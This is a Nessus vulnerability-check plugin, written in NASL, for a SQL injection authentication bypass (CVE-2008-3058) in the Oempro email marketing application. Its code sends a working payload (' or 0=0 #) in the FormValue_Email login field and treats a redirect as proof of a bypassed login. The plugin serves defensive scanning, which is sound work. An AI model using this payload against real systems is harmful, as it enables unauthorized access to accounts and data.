#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(35041);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2008-3058");
  script_bugtraq_id(32784);
  script_osvdb_id(50322);

  script_name(english:"Oempro index.php FormValue_Email Parameter SQL Injection Authentication Bypass");
  script_summary(english:"Tries to bypass authentication");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Oempro, a commercial list management and
email marketing application written in PHP. 

The installed version of Oempro fails to sanitize user-supplied input
to the 'FormValue_Email' parameter of the 'index.php' script before
using it in a database query.  An unauthenticated, remote attacker can
leverage this issue to manipulate SQL queries and bypass
authentication or launch other sorts of SQL injection attacks against
the affected host. 

Note that there are also reportedly several other issues that are
likely associated with this version of Oempro, including insecure
cookie disclosure, password disclosure, and cross-frame scripting. 
Nessus has not, though, checked for those." );
 script_set_attribute(attribute:"see_also", value:"http://osvdb.org/ref/50/oempro.txt" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Oempro version 4 or later as that is reported to resolve
the issue." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(89);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/12/05");
 script_cvs_date("$Date: 2015/09/24 23:21:18 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:octeth:oempro");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, php: 1);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/oempro", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure the script exists.
  url = string(dir, "/member/index.php");

  res = http_get_cache(item:url, port:port, exit_on_fail: 1);

  # If it does...
  if (
    '<input name="FormValue_Email"' >< res &&
    '>oemPro v' >< res
  )
  {
    # Try to exploit the issue to bypass authentication.
    exploit = "' or 0=0 #";
    postdata = string(
      "FormValue_Email=", exploit, "&",
      "FormValue_Password=password&",
      "FormButton_Login=Login&",
      "FormValue_FromURL="
    );

    req = http_mk_post_req(
      port        : port,
      version     : 11, 
      item        : url, 
      add_headers : make_array("Content-Type", "application/x-www-form-urlencoded"),
      data        : postdata
    );
    res = http_send_recv_req(port:port, req:req, exit_on_fail: 1);

    # There's a problem if it looks like we could log in.
    if (
      res[0] =~ "^HTTP/1\.[01] +302 " &&
      egrep(pattern:"^Location: .*\/bridge\.php\?GoToURL=", string:res[1], icase:TRUE)
    )
    {
      if (report_verbosity)
      {
        req_str = http_mk_buffer_from_req(req:req);
        report = string(
          "\n",
          "Nessus was able to exploit the issue to bypass authentication using\n",
          "the following request :\n",
          "\n",
          "  ", str_replace(find:'\r\n', replace:'\n  ', string:req_str), "\n"
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);

      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);

      exit(0);
    }
  }
}
